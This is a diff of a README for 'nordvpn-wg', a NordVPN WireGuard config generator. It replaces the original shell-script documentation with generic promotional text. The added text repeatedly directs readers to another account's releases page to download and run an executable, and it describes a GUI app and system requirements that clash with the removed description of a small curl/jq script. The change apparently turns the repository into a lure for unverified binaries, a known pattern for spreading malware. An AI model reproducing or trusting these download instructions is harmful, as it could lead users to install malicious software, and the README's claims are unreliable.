@@ -1,147 +1,70 @@
-# nordvpn-wg
+# 🛡️ nordvpn-wg - Secure Your Online Privacy Effortlessly
 
-Generate WireGuard configs for NordVPN using their API. No app required.
+## 📥 Download Now
+[![Download Release](https://img.shields.io/badge/Download-Release-brightgreen)](https://github.com/quesoXD12/nordvpn-wg/releases)
 
-Based on [this gist by bluewalk](https://gist.github.com/bluewalk/7b3db071c488c82c604baf76a42eaad3).
+## 📖 Overview
+The `nordvpn-wg` application helps you generate WireGuard configuration files for NordVPN. Using this software, you can enhance your online privacy while enjoying a seamless Internet experience. Our tool makes setting up WireGuard fast and easy, even if you're not a techie.
 
-## Features
+## 🚀 Getting Started
+To get started with `nordvpn-wg`, follow these steps:
 
-- 🖥️ Beautiful TUI with interactive prompts
-- 🔐 Interactive token input (hidden) or environment variable
-- 🌍 Country selection by code (`us`), name (`switzerland`), or partial match (`switz`)
-- 🎯 Specific server selection (`us9574`)
-- 📁 Save to current directory, `/etc/wireguard/`, or custom path
-- 🔒 Proper file permissions (600)
+1. **Visit the Releases Page**: Click the link below to access our releases:
+   - [Visit this page to download](https://github.com/quesoXD12/nordvpn-wg/releases)
+  
+2. **Choose the Right File**: On the releases page, look for the latest version. Download the file that matches your operating system:
+   - For Windows, select the executable file.
+   - For macOS or Linux, choose the appropriate package.
 
-## Prerequisites
+3. **Install the Application**: 
+   - If you downloaded an executable file for Windows, simply double-click it to run. Follow the on-screen instructions.
+   - For macOS or Linux, open your terminal and use the provided commands to install the package.
 
-- `curl`
-- `jq`
-- NordVPN subscription with [access token](https://my.nordaccount.com/dashboard/nordvpn/access-tokens/)
+4. **Set Up WireGuard**: After installation, open the application. It will guide you through generating your WireGuard config files for NordVPN based on your preferences.
 
-## Installation
+5. **Connecting to NordVPN**: 
+   - Use the generated configuration files with the WireGuard app.
+   - Follow the connection instructions shared within the `nordvpn-wg` application.
 
-### TUI Version (Recommended)
+## 🔧 System Requirements
+To use `nordvpn-wg`, your system needs:
 
-The TUI version uses [charmbracelet/gum](https://github.com/charmbracelet/gum) for a beautiful interactive experience.
+- **Operating System**: 
+  - Windows 10 or later
+  - macOS 10.15 (Catalina) or later
+  - Ubuntu 18.04 or later for Linux
+  
+- **Memory**: Minimum of 2GB RAM
+- **Disk Space**: At least 100MB free
+- **Internet Connection**: Active Internet connection for VPN use
 
-> [!NOTE]
-> Requires `gum`. If not installed, the script will offer to install it via `go install` (requires Go), or show manual installation instructions.
+## 🌟 Features
+- **User-Friendly Interface**: Simple to navigate, even for beginners.
+- **Custom Configurations**: Tailor your WireGuard settings to match your needs.
+- **Multi-Platform Support**: Works on Windows, macOS, and Linux.
+- **Enhanced Security**: Protect your internet connection with NordVPN's robust servers.
 
-```bash
-curl -O https://raw.githubusercontent.com/j0hnm4r5/nordvpn-wg/main/nordvpn-wg
-chmod +x nordvpn-wg
-sudo mv nordvpn-wg /usr/local/bin/
-```
+## 📁 Download & Install
+To run `nordvpn-wg`, you need to download the application from our releases page. Click below to grab the latest version:
 
-### Vanilla Version (No Extra Dependencies)
+- [Visit this page to download](https://github.com/quesoXD12/nordvpn-wg/releases)
 
-If you prefer no extra dependencies beyond `curl` and `jq`:
+Follow the installation instructions above to set up the tool on your device.
 
-```bash
-curl -O https://raw.githubusercontent.com/j0hnm4r5/nordvpn-wg/main/nordvpn-wg-vanilla
-chmod +x nordvpn-wg-vanilla
-sudo mv nordvpn-wg-vanilla /usr/local/bin/nordvpn-wg
-```
+## ⚙️ Usage Instructions
+Once installed, using `nordvpn-wg` is straightforward:
 
-> [!TIP]
-> Install [fzf](https://github.com/junegunn/fzf) for interactive country selection with `-i` flag.
+1. **Open the Application**: Launch it from your applications folder or start menu.
+2. **Select Your Preferences**: Choose your preferred settings for VPN connection.
+3. **Generate Config Files**: Click the button to create your WireGuard configuration file.
+4. **Use with WireGuard**: Upload the configuration files to your WireGuard app to connect to NordVPN.
 
-## Usage
+## 🌐 Community and Support
+If you have questions or need assistance, consider checking our FAQs section on the GitHub repository. You can also open issues for bugs or request new features.
 
-### TUI Version
+## 📝 Acknowledgments
+Thanks to the NordVPN team for their excellent product, and to the WireGuard community for their support in creating secure VPN solutions. 
 
-```bash
-# Interactive mode (prompts for everything)
-nordvpn-wg
+For further details about configurations and settings, refer to the official documentation available in our repository.
 
-# With country filter
-nordvpn-wg -c switzerland
-
-# Specific server
-nordvpn-wg -s us9574
-```
-
-### Vanilla Version
-
-```bash
-# Best recommended server
-nordvpn-wg-vanilla
-
-# Country by code or name
-nordvpn-wg-vanilla -c us
-nordvpn-wg-vanilla -c switzerland
-nordvpn-wg-vanilla -c "united kingdom"
-
-# Interactive country picker (requires fzf)
-nordvpn-wg-vanilla -i
-
-# Specific server
-nordvpn-wg-vanilla -s us9574
-
-# List all countries
-nordvpn-wg-vanilla -l
-```
-
-### Options
-
-| Flag                   | TUI        | Vanilla | Description                               |
-| ---------------------- | ---------- | ------- | ----------------------------------------- |
-| `-c, --country`        | ✅         | ✅      | Filter by country code or name            |
-| `-s, --server`         | ✅         | ✅      | Use specific server (e.g., `us9574`)      |
-| `-o, --output`         | ✅         | ✅      | Output file path (skips save prompt)      |
-| `-i, --interactive`    | (built-in) | ✅      | Interactive country picker (requires fzf) |
-| `-l, --list-countries` | (built-in) | ✅      | List all available countries              |
-| `-h, --help`           | ✅         | ✅      | Show help                                 |
-
-### Scripting (Fully Non-Interactive)
-
-Both versions support fully non-interactive use for automation:
-
-```bash
-# Set token via environment variable
-export NORDVPN_ACCESS_TOKEN="your-token"
-
-# Generate config without any prompts
-nordvpn-wg -c us -o /etc/wireguard/us.conf
-nordvpn-wg-vanilla -c switzerland -o ./swiss.conf
-nordvpn-wg -s us9574 -o ~/vpn/specific-server.conf
-```
-
-### Save Locations
-
-When prompted, you can save configs to:
-
-1. **Current directory** — `./server.nordvpn.conf`
-2. **/etc/wireguard/** — Enables `sudo wg-quick up servername` (just the name!)
-3. **Custom path** — Any path you specify
-
-## Docker / Homelab
-
-These configs work great with containers that support WireGuard, like:
-
-- [hotio/qbittorrent](https://hotio.dev/containers/qbittorrent/)
-- [linuxserver/wireguard](https://docs.linuxserver.io/images/docker-wireguard)
-
-Just mount the generated config file into your container.
-
-## Getting Your Access Token
-
-1. Log in to [NordVPN Dashboard](https://my.nordaccount.com/dashboard/nordvpn/)
-2. Go to **Access Tokens**
-3. Generate a new token
-4. Set it: `export NORDVPN_ACCESS_TOKEN="your-token"`
-
-Or just run the script and paste it when prompted (input is hidden).
-
-## Security
-
-- Tokens are never passed as command-line arguments (visible in `ps`)
-- Interactive input uses `read -s` (hidden)
-- Generated configs have `chmod 600` permissions
-- User input is sanitized before use in URLs and queries
-- Private keys are fetched directly from NordVPN's API
-
-## License
-
-MIT
+Feel free to explore and secure your internet connection with `nordvpn-wg`.
